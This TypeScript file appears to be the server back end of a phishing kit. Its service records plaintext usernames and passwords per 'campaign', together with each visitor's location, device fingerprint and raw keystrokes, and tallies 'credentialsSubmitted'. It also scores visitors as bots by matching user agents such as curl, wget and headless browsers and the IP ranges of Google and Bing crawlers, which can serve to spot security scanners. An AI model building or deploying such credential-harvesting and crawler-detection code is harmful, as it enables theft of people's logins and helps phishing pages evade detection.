import { db } from '../db';
import { sessions, campaignAnalytics } from '@shared/schema';
import { eq, and, gte, lte, sql } from 'drizzle-orm';
import UAParser from 'ua-parser-js';
import geoip from 'geoip-lite';

interface SessionData {
  campaignId: string;
  ipAddress: string;
  userAgent: string;
  username?: string;
  password?: string;
  additionalData?: Record<string, any>;
}

interface DeviceFingerprint {
  screenResolution: string;
  colorDepth: number;
  timezone: string;
  language: string;
  plugins: string[];
  fonts: string[];
  canvas: string;
  webgl: string;
}

interface InteractionData {
  mouseMovements: Array<{ x: number; y: number; timestamp: number }>;
  keystrokes: Array<{ key: string; timestamp: number }>;
  scrollBehavior: Array<{ position: number; timestamp: number }>;
  clickEvents: Array<{ x: number; y: number; element: string; timestamp: number }>;
}

export class SessionAnalyticsService {
  // Create enhanced session with analytics
  async createSession(sessionData: SessionData, deviceFingerprint?: DeviceFingerprint, interactionData?: InteractionData) {
    try {
      // Parse user agent
      const parser = new UAParser(sessionData.userAgent);
      const device = parser.getDevice();
      const browser = parser.getBrowser();
      const os = parser.getOS();

      // Get geolocation from IP
      const geo = geoip.lookup(sessionData.ipAddress);

      // Calculate bot detection scores
      const botAnalysis = this.analyzeBotBehavior(sessionData, deviceFingerprint, interactionData);

      // Create session record
      const session = await db.insert(sessions).values({
        campaignId: sessionData.campaignId,
        ipAddress: sessionData.ipAddress,
        userAgent: sessionData.userAgent,
        username: sessionData.username,
        password: sessionData.password,
        status: botAnalysis.isBot ? 'bot_detected' : 'pending',
        
        // Device information
        deviceType: this.getDeviceType(device),
        operatingSystem: os.name || 'Unknown',
        browser: browser.name || 'Unknown',
        browserVersion: browser.version || 'Unknown',
        screenResolution: deviceFingerprint?.screenResolution || 'Unknown',
        timezone: deviceFingerprint?.timezone || 'Unknown',
        language: deviceFingerprint?.language || 'Unknown',

        // Geolocation
        geolocation: geo ? {
          country: geo.country,
          region: geo.region,
          city: geo.city,
          latitude: geo.ll[0],
          longitude: geo.ll[1],
          timezone: geo.timezone
        } : null,

        // Device fingerprint
        deviceFingerprint: deviceFingerprint ? {
          screenResolution: deviceFingerprint.screenResolution,
          colorDepth: deviceFingerprint.colorDepth,
          timezone: deviceFingerprint.timezone,
          language: deviceFingerprint.language,
          plugins: deviceFingerprint.plugins,
          fonts: deviceFingerprint.fonts,
          canvas: deviceFingerprint.canvas,
          webgl: deviceFingerprint.webgl
        } : null,

        // Interaction tracking
        mouseMovements: interactionData?.mouseMovements || null,
        keystrokes: interactionData?.keystrokes || null,
        scrollBehavior: interactionData?.scrollBehavior || null,

        // Bot detection scores
        botScore: botAnalysis.botScore,
        humanScore: botAnalysis.humanScore,
        riskLevel: botAnalysis.riskLevel,

        additionalData: sessionData.additionalData,
        createdAt: new Date(),
        updatedAt: new Date()
      }).returning();

      // Update daily analytics
      await this.updateDailyAnalytics(sessionData.campaignId, session[0]);

      return session[0];
    } catch (error) {
      console.error('Failed to create session:', error);
      throw error;
    }
  }

  // Update session with completion data
  async updateSessionCompletion(sessionId: string, completionData: {
    status: 'complete' | 'failed';
    completionPercentage: number;
    timeOnPage: number;
    additionalData?: Record<string, any>;
  }) {
    try {
      await db.update(sessions)
        .set({
          status: completionData.status,
          completionPercentage: completionData.completionPercentage,
          timeOnPage: completionData.timeOnPage,
          additionalData: completionData.additionalData,
          completedAt: new Date(),
          updatedAt: new Date()
        })
        .where(eq(sessions.id, sessionId));

      // Update campaign analytics
      await this.updateCampaignMetrics(sessionId);
    } catch (error) {
      console.error('Failed to update session completion:', error);
      throw error;
    }
  }

  // Analyze bot behavior patterns
  private analyzeBotBehavior(sessionData: SessionData, deviceFingerprint?: DeviceFingerprint, interactionData?: InteractionData) {
    let botScore = 0;
    const factors: string[] = [];

    // User agent analysis
    if (!sessionData.userAgent) {
      botScore += 30;
      factors.push('Missing user agent');
    } else if (this.isSuspiciousUserAgent(sessionData.userAgent)) {
      botScore += 20;
      factors.push('Suspicious user agent');
    }

    // Device fingerprint analysis
    if (!deviceFingerprint) {
      botScore += 15;
      factors.push('Missing device fingerprint');
    } else {
      // Check for common bot patterns
      if (deviceFingerprint.plugins.length === 0) {
        botScore += 10;
        factors.push('No browser plugins');
      }
      if (deviceFingerprint.fonts.length < 10) {
        botScore += 10;
        factors.push('Limited font list');
      }
    }

    // Interaction analysis
    if (!interactionData) {
      botScore += 25;
      factors.push('No interaction data');
    } else {
      // Mouse movement patterns
      if (interactionData.mouseMovements.length < 5) {
        botScore += 15;
        factors.push('Limited mouse movement');
      }
      
      // Keyboard patterns
      if (interactionData.keystrokes.length === 0) {
        botScore += 10;
        factors.push('No keyboard interaction');
      }

      // Speed analysis
      const totalTime = this.calculateInteractionTime(interactionData);
      if (totalTime < 2000) { // Less than 2 seconds
        botScore += 20;
        factors.push('Suspiciously fast interaction');
      }
    }

    // IP analysis
    if (this.isKnownBotIP(sessionData.ipAddress)) {
      botScore += 25;
      factors.push('Known bot IP');
    }

    const humanScore = Math.max(0, 100 - botScore);
    const riskLevel = botScore > 70 ? 'high' : botScore > 40 ? 'medium' : 'low';

    return {
      botScore: Math.min(100, botScore),
      humanScore,
      riskLevel,
      isBot: botScore > 60,
      factors
    };
  }

  // Check if user agent is suspicious
  private isSuspiciousUserAgent(userAgent: string): boolean {
    const suspiciousPatterns = [
      /bot/i,
      /crawler/i,
      /spider/i,
      /scraper/i,
      /python/i,
      /curl/i,
      /wget/i,
      /headless/i
    ];

    return suspiciousPatterns.some(pattern => pattern.test(userAgent));
  }

  // Check if IP is known bot IP
  private isKnownBotIP(ipAddress: string): boolean {
    // Common bot IP ranges (simplified - in production, use a comprehensive database)
    const botRanges = [
      /^66\.249\./, // Google Bot
      /^40\.77\./,  // Bing Bot
      /^157\.55\./, // Bing Bot
    ];

    return botRanges.some(range => range.test(ipAddress));
  }

  // Calculate total interaction time
  private calculateInteractionTime(interactionData: InteractionData): number {
    const timestamps: number[] = [];
    
    timestamps.push(...interactionData.mouseMovements.map(m => m.timestamp));
    timestamps.push(...interactionData.keystrokes.map(k => k.timestamp));
    timestamps.push(...interactionData.scrollBehavior.map(s => s.timestamp));

    if (timestamps.length < 2) return 0;

    return Math.max(...timestamps) - Math.min(...timestamps);
  }

  // Determine device type
  private getDeviceType(device: any): string {
    if (device.type === 'mobile') return 'mobile';
    if (device.type === 'tablet') return 'tablet';
    return 'desktop';
  }

  // Update daily analytics
  private async updateDailyAnalytics(campaignId: string, session: any) {
    try {
      const today = new Date();
      today.setHours(0, 0, 0, 0);

      // Check if analytics record exists for today
      const existingAnalytics = await db.select()
        .from(campaignAnalytics)
        .where(and(
          eq(campaignAnalytics.campaignId, campaignId),
          eq(campaignAnalytics.date, today)
        ))
        .limit(1);

      const deviceIncrement = {
        desktopVisits: session.deviceType === 'desktop' ? 1 : 0,
        mobileVisits: session.deviceType === 'mobile' ? 1 : 0,
        tabletVisits: session.deviceType === 'tablet' ? 1 : 0
      };

      const securityIncrement = {
        botDetections: session.status === 'bot_detected' ? 1 : 0,
        suspiciousActivities: session.riskLevel === 'high' ? 1 : 0
      };

      if (existingAnalytics.length) {
        // Update existing record
        await db.update(campaignAnalytics)
          .set({
            uniqueVisitors: sql`${campaignAnalytics.uniqueVisitors} + 1`,
            desktopVisits: sql`${campaignAnalytics.desktopVisits} + ${deviceIncrement.desktopVisits}`,
            mobileVisits: sql`${campaignAnalytics.mobileVisits} + ${deviceIncrement.mobileVisits}`,
            tabletVisits: sql`${campaignAnalytics.tabletVisits} + ${deviceIncrement.tabletVisits}`,
            botDetections: sql`${campaignAnalytics.botDetections} + ${securityIncrement.botDetections}`,
            suspiciousActivities: sql`${campaignAnalytics.suspiciousActivities} + ${securityIncrement.suspiciousActivities}`
          })
          .where(eq(campaignAnalytics.id, existingAnalytics[0].id));
      } else {
        // Create new record
        await db.insert(campaignAnalytics).values({
          campaignId,
          date: today,
          uniqueVisitors: 1,
          ...deviceIncrement,
          ...securityIncrement,
          topCountries: session.geolocation ? [session.geolocation.country] : [],
          topCities: session.geolocation ? [session.geolocation.city] : []
        });
      }
    } catch (error) {
      console.error('Failed to update daily analytics:', error);
    }
  }

  // Update campaign metrics after session completion
  private async updateCampaignMetrics(sessionId: string) {
    try {
      const session = await db.select()
        .from(sessions)
        .where(eq(sessions.id, sessionId))
        .limit(1);

      if (!session.length) return;

      const sessionData = session[0];
      const today = new Date();
      today.setHours(0, 0, 0, 0);

      if (sessionData.status === 'complete') {
        await db.update(campaignAnalytics)
          .set({
            credentialsSubmitted: sql`${campaignAnalytics.credentialsSubmitted} + 1`
          })
          .where(and(
            eq(campaignAnalytics.campaignId, sessionData.campaignId!),
            eq(campaignAnalytics.date, today)
          ));
      }
    } catch (error) {
      console.error('Failed to update campaign metrics:', error);
    }
  }

  // Get analytics for a campaign
  async getCampaignAnalytics(campaignId: string, startDate?: Date, endDate?: Date) {
    try {
      const conditions = [eq(campaignAnalytics.campaignId, campaignId)];
      
      if (startDate) {
        conditions.push(gte(campaignAnalytics.date, startDate));
      }
      
      if (endDate) {
        conditions.push(lte(campaignAnalytics.date, endDate));
      }

      const analytics = await db.select()
        .from(campaignAnalytics)
        .where(and(...conditions))
        .orderBy(campaignAnalytics.date);

      return analytics;
    } catch (error) {
      console.error('Failed to get campaign analytics:', error);
      return [];
    }
  }

  // Get session details with analytics
  async getSessionDetails(sessionId: string) {
    try {
      const session = await db.select()
        .from(sessions)
        .where(eq(sessions.id, sessionId))
        .limit(1);

      return session[0];
    } catch (error) {
      console.error('Failed to get session details:', error);
      return null;
    }
  }
}

// Export singleton instance
export const sessionAnalyticsService = new SessionAnalyticsService();